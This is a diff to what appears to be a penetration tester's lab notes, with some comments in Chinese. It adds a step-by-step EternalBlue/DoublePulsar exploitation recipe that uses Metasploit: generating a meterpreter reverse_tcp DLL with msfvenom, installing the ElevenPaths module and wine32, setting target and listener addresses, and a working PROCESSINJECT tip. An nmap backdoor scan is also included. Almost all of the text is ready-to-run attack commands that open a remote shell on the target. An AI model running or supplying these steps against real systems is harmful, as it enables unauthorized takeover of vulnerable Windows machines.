@@ -119,6 +119,9 @@ SUM:                           312           4311           3492          69653
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.133 lport=4444 -f dll -o ~/eternal11.dll
 
 
+use exploit/windows/smb/eternalblue_doublepulsar
+
+
 set payload payload/windows/meterpreter/reverse_tcp
 
 set winepath /home/kali/           ----- - Writing DLL in /home/kali/eternal11.dll
@@ -127,3 +130,33 @@ set winepath /home/kali/           ----- - Writing DLL in /home/kali/eternal11.d
   set DOUBLEPULSARPATH  /home/kali/Eternalblue-Doublepulsar-Metasploit-master-master/Eternalblue-Doublepulsar-Metasploit-master/deps
 
   set ETERNALBLUEPATH /home/kali/Eternalblue-Doublepulsar-Metasploit-master-master/Eternalblue-Doublepulsar-Metasploit-master/deps
+
+set rhost 192.168.56.141
+
+## nmap
+nmap -p 445 <target> --script=smb-double-pulsar-backdoor
+
+
+
+# 下载对应的MSF插件并复制到目标目录中
+git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
+cd Eternalblue-Doublepulsar-Metasploit/
+cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
+
+# 安装依赖
+dpkg --add-architecture i386 && apt-get update && apt-get install wine32 --fix-missing
+
+# 创建.wine/drive_c目录，否则后续利用漏洞时会出现目录不存在错误
+mkdir -p /root/.wine/drive_c
+
+# 开启MSF并重新加载插件
+msfconsole
+reload_all
+
+# 漏洞利用
+use exploit/windows/smb/eternalblue_doublepulsar
+set rhost 192.168.200.142
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.200.130
+set PROCESSINJECT explorer.exe # 注意，需要设置PROCESSINJECT，使用默认值并没成功，改PROCESSINJECT为explorer.exe成功
+run
